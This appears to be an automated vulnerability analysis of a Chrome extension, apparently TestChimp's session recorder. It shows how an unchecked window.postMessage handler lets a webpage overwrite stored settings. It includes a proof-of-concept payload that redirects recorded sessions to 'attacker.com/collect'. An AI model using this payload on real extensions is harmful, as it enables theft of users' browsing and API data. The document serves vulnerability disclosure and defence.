# CoCo Analysis: ailhophdeloancmhdklbbkobcbbnbglm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate flows)

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ailhophdeloancmhdklbbkobcbbnbglm/opgen_generated_files/cs_0.js
Line 5848	window.addEventListener("message", function (event) {
Line 5853	  if (event.data.type === "interceptedResponse") {
Line 5907	      console.log("Received extension configuration message:", event.data.payload);
```

**Code:**

```javascript
// Content script - Entry point (testchimp-sdk-ext.js, line 5848)
window.addEventListener("message", function (event) {
  if (event.source !== window) {
    return;
  }

  // ... other message types ...

  // Storage poisoning sink
  if (event.data.type === "update_tc_ext_config") { // Line 5906
    console.log("Received extension configuration message:", event.data.payload);
    var dataToStore = event.data.payload; // ← attacker-controlled

    // Store attacker data directly in chrome.storage.sync
    chrome.storage.sync.set(dataToStore, function () { // Line 5912
      if (chrome.runtime.lastError) {
        console.error("Error storing data:", chrome.runtime.lastError.message);
        window.postMessage({
          type: "update_tc_ext_config_response",
          success: false,
          error: chrome.runtime.lastError.message
        }, "*");
      } else {
        window.postMessage({
          type: "update_tc_ext_config_response",
          success: true
        }, "*");
      }
    });
  }
});

// Storage retrieval and exploitation (line 6003)
chrome.storage.sync.get(['projectId', 'sessionRecordingApiKey', 'endpoint', 'maxSessionDurationSecs', 'eventWindowToSaveOnError', 'uriRegexToIntercept'], function (items) {
  if (chrome.runtime.lastError) {
    console.error('Error retrieving settings from storage:', chrome.runtime.lastError);
    return;
  }
  startRecording({
    projectId: items.projectId,
    sessionRecordingApiKey: items.sessionRecordingApiKey,
    endpoint: items.endpoint, // ← attacker-controlled endpoint
    samplingProbabilityOnError: 0.0,
    samplingProbability: 1.0,
    maxSessionDurationSecs: items.maxSessionDurationSecs || 500,
    eventWindowToSaveOnError: 200,
    untracedUriRegexListToTrack: items.uriRegexToIntercept || '.*'
  });
});

// startRecording function (line 5762-5830)
function startRecording(config) {
  console.log("Initializing recording for TestChimp Project: " + config.projectId);
  endpoint = config.endpoint || 'https://ingress.testchimp.io'; // ← attacker-controlled
  sessionId = generateSessionId();

  // ... validation and config setup ...

  // Send session data to attacker-controlled endpoint
  if (shouldRecordSession) {
    sessionManager = startSendingEvents(endpoint, config, sessionId); // Line 5830
    // ← Sends captured session data/API responses to attacker's server
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage code - poison storage with attacker endpoint
window.postMessage({
  type: "update_tc_ext_config",
  payload: {
    endpoint: "https://attacker.com/collect",
    projectId: "malicious-project",
    sessionRecordingApiKey: "fake-key",
    uriRegexToIntercept: ".*"
  }
}, "*");

// Wait for confirmation
window.addEventListener("message", function(event) {
  if (event.data.type === "update_tc_ext_config_response") {
    if (event.data.success) {
      console.log("Storage poisoned successfully!");
      console.log("Extension will now send all session recordings to attacker.com");
      // On next page load or recording trigger, all captured data goes to attacker
    }
  }
});
```

**Impact:** Complete storage exploitation chain leading to data exfiltration. The attacker can poison chrome.storage.sync with a malicious endpoint URL, and when the extension starts recording user sessions (including captured API requests/responses, user interactions, etc.), all session data is sent to the attacker-controlled server instead of the legitimate TestChimp endpoint. This enables full interception of sensitive user activity and API traffic captured by the extension.
